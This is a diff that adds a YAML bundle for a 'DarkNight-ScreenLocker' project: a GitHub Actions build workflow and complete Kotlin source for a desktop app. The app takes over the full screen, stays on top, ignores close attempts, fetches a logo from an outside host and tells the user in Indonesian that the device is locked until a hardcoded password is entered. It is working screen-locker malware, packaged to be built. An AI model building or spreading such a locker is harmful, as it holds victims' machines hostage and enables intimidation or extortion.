@@ -1,98 +1,162 @@
-name: Build Android APK
+version: "1.0"
+project: "DarkNight-ScreenLocker"
+config:
+  password: "Xen404"
+  image_url: "https://ganga--link--ghhzdp9sv8hk.code.run/i/pa2qw8bgea.jpg"
+  window_title: "SYSTEM LOCKED"
+  background_color: "#0a0a0a"
+  text_color: "#ff3333"
+  accent_color: "#00ffcc"
 
-on:
-  push:
-    branches: [ main ]
+github_workflow: |
+  name: Build Dark Night Locker
+  on: [push, pull_request]
+  jobs:
+    build:
+      runs-on: ubuntu-latest
+      steps:
+        - uses: actions/checkout@v4
+        - uses: actions/setup-java@v4
+          with:
+            distribution: 'temurin'
+            java-version: '17'
+        - name: Compile Kotlin to JAR
+          run: |
+            curl -sL https://github.com/JetBrains/kotlin/releases/download/v1.9.23/kotlin-compiler-1.9.23.zip -o kotlin.zip
+            unzip -q kotlin.zip && sudo mv kotlinc /opt/ && echo "/opt/kotlinc/bin" >> $GITHUB_PATH
+            kotlinc ScreenLocker.kt -include-runtime -d ScreenLocker.jar
+        - uses: actions/upload-artifact@v4
+          with:
+            name: DarkNight-Locker-Binary
+            path: ScreenLocker.jar
 
-jobs:
-  build:
-    runs-on: ubuntu-latest
+source_code_kotlin: |
+  package com.darknight.locker
 
-    steps:
-    - name: Checkout Repository
-      uses: actions/checkout@v4
+  import java.awt.*
+  import java.awt.event.WindowAdapter
+  import java.awt.event.WindowEvent
+  import java.net.URL
+  import javax.imageio.ImageIO
+  import javax.swing.*
 
-    - name: Set up JDK 17
-      uses: actions/setup-java@v4
-      with:
-        distribution: 'temurin'
-        java-version: '17'
+  class ScreenLockerApp : JFrame() {
+      private val correctPassword = "Xen404"
+      private val imageUrl = "https://ganga--link--ghhzdp9sv8hk.code.run/i/pa2qw8bgea.jpg"
+      private lateinit var passwordField: JPasswordField
+      private lateinit var statusLabel: JLabel
+      private var failedAttempts = 0
 
-    - name: Setup Android SDK & Build APK
-      run: |
-        # Buat direktori struktur project Android
-        mkdir -p app/src/main/res/layout
-        mkdir -p app/src/main/res/drawable
-        
-        # Buat AndroidManifest.xml
-        cat << 'EOF' > app/src/main/AndroidManifest.xml
-        <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-            package="com.example.lockscreen">
-            <application
-                android:label="System Lock"
-                android:theme="@style/Theme.AppCompat.NoActionBar">
-                <activity
-                    android:name=".MainActivity"
-                    android:exported="true">
-                    <intent-filter>
-                        <action android:name="android.intent.action.MAIN" />
-                        <category android:name="android.intent.category.LAUNCHER" />
-                    </intent-filter>
-                </activity>
-            </application>
-        </manifest>
-        EOF
+      init {
+          title = "SYSTEM LOCKED - DARK NIGHT"
+          defaultCloseOperation = DO_NOTHING_ON_CLOSE
+          isUndecorated = true
+          isAlwaysOnTop = true
+          background = Color(10, 10, 10)
 
-        # Buat build.gradle app level
-        cat << 'EOF' > app/build.gradle
-        plugins {
-            id 'com.android.application'
-        }
-        android {
-            compileSdk 34
-            defaultConfig {
-                applicationId "com.example.lockscreen"
-                minSdk 21
-                targetSdk 34
-                versionCode 1
-                versionName "1.0"
-            }
-            compileOptions {
-                sourceCompatibility JavaVersion.VERSION_17
-                targetCompatibility JavaVersion.VERSION_17
-            }
-        }
-        dependencies {
-            implementation 'androidx.appcompat:appcompat:1.6.1'
-        }
-        EOF
+          val device = GraphicsEnvironment.getLocalGraphicsEnvironment().defaultScreenDevice
+          if (device.isFullScreenSupported) {
+              device.fullScreenWindow = this
+          } else {
+              extendedState = MAXIMIZED_BOTH
+          }
 
-        # Buat settings.gradle
-        echo "include ':app'" > settings.gradle
+          initUI()
+          
+          addWindowListener(object : WindowAdapter() {
+              override fun windowClosing(e: WindowEvent?) {}
+          })
+      }
 
-        # Buat build.gradle root level
-        cat << 'EOF' > build.gradle
-        buildscript {
-            repositories {
-                google()
-                mavenCentral()
-            }
-            dependencies {
-                classpath 'com.android.tools.build:gradle:8.1.1'
-            }
-        }
-        allprojects {
-            repositories {
-                google()
-                mavenCentral()
-            }
-        }
-        EOF
+      private fun initUI() {
+          val mainPanel = JPanel().apply {
+              layout = GridBagLayout()
+              background = Color(10, 10, 10)
+          }
+          val gbc = GridBagConstraints().apply {
+              gridx = 0
+              gridy = GridBagConstraints.RELATIVE
+              insets = Insets(10, 10, 10, 10)
+              anchor = GridBagConstraints.CENTER
+          }
 
-        # Buat local.properties untuk mendefinisikan lokasi Android SDK otomatis
-        echo "sdk.dir=$ANDROID_HOME" > local.properties
+          try {
+              val url = URL(imageUrl)
+              val originalImage = ImageIO.read(url)
+              val scaledImage = originalImage.getScaledInstance(150, 150, Image.SCALE_SMOOTH)
+              val logoLabel = JLabel(ImageIcon(scaledImage))
+              mainPanel.add(logoLabel, gbc)
+          } catch (e: Exception) {
+              val errorLabel = JLabel("[ Gagal Memuat Logo dari Server ]").apply {
+                  foreground = Color(255, 85, 85)
+                  font = Font("Courier New", Font.BOLD, 12)
+              }
+              mainPanel.add(errorLabel, gbc)
+          }
 
-        # Inisialisasi wrapper dan jalankan build assembleDebug
-        gradle wrapper --gradle-version 8.1.1
-        chmod +x gradlew
-        ./gradlew assembleDebug --stacktrace
+          val titleLabel = JLabel("SYSTEM LOCKED").apply {
+              foreground = Color(255, 51, 51)
+              font = Font("Courier New", Font.BOLD, 28)
+          }
+          mainPanel.add(titleLabel, gbc)
+
+          val descLabel = JLabel("<html><center>Seluruh akses ke perangkat ini telah dikunci oleh Dark Night.<br>Masukkan password yang valid untuk memulihkan sistem.</center></html>").apply {
+              foreground = Color(204, 204, 204)
+              font = Font("Arial", Font.PLAIN, 13)
+          }
+          mainPanel.add(descLabel, gbc)
+
+          passwordField = JPasswordField(20).apply {
+              font = Font("Courier New", Font.BOLD, 18)
+              background = Color(26, 26, 26)
+              foreground = Color(0, 255, 204)
+              caretColor = Color(0, 255, 204)
+              horizontalAlignment = JTextField.CENTER
+              addActionListener { verifyPassword() }
+          }
+          mainPanel.add(passwordField, gbc)
+
+          val unlockButton = JButton("UNLOCK SYSTEM").apply {
+              font = Font("Courier New", Font.BOLD, 14)
+              background = Color(255, 51, 51)
+              foreground = Color.WHITE
+              isFocusPainted = false
+              addActionListener { verifyPassword() }
+          }
+          mainPanel.add(unlockButton, gbc)
+
+          statusLabel = JLabel("").apply {
+              foreground = Color(255, 85, 85)
+              font = Font("Arial", Font.ITALIC, 11)
+          }
+          mainPanel.add(statusLabel, gbc)
+
+          add(mainPanel)
+      }
+
+      private fun verifyPassword() {
+          val enteredPass = String(passwordField.password)
+          if (enteredPass == correctPassword) {
+              statusLabel.foreground = Color(0, 255, 204)
+              statusLabel.text = "Akses Diterima. Membuka sistem..."
+              Timer(1000) {
+                  dispose()
+                  System.exit(0)
+              }.apply {
+                  isRepeats = false
+                  start()
+              }
+          } else {
+              failedAttempts++
+              statusLabel.foreground = Color(255, 51, 51)
+              statusLabel.text = "Password Salah! Percobaan gagal ke-$failedAttempts"
+              passwordField.text = ""
+          }
+      }
+  }
+
+  fun main() {
+      EventQueue.invokeLater {
+          ScreenLockerApp().isVisible = true
+      }
+  }
